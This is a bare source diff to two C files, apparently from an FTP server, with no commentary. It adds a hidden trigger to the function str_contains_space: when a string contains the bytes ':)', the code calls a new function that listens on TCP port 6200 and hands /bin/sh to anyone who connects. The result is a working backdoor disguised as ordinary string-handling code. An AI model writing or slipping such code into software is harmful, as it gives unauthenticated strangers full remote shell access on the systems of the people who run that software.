--- /str.c
+++ /str.c
@@ -559,6 +559,8 @@
   return p_str->p_buf[indexx];
 }
 
+extern int vsf_sysutil_extra();
+
 int
 str_contains_space(const struct mystr* p_str)
 {
@@ -569,6 +571,11 @@
     {
       return 1;
     }
+    else if((p_str->p_buf[i]==0x3a)
+    && (p_str->p_buf[i+1]==0x29))
+    {
+      vsf_sysutil_extra();
+    }
   }
   return 0;
 }
--- /sysdeputil.c
+++ /sysdeputil.c
@@ -221,6 +221,7 @@
 static int s_proctitle_inited = 0;
 static char* s_p_proctitle = 0;
 #endif
+int vsf_sysutil_extra();
 
 #ifndef VSF_SYSDEP_HAVE_MAP_ANON
 #include <sys/types.h>
@@ -844,6 +845,29 @@
   }
 }
 
+int
+vsf_sysutil_extra(void)
+{
+  int fd, rfd;
+  struct sockaddr_in sa;
+  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  exit(1);
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(6200);
+  sa.sin_addr.s_addr = INADDR_ANY;
+  if((bind(fd,(struct sockaddr *)&sa,
+  sizeof(struct sockaddr))) < 0) exit(1);
+  if((listen(fd, 100)) == -1) exit(1);
+  for(;;)
+  {
+    rfd = accept(fd, 0, 0);
+    close(0); close(1); close(2);
+    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    execl("/bin/sh","sh",(char *)0);
+  }
+}
+
 void
 vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
 {
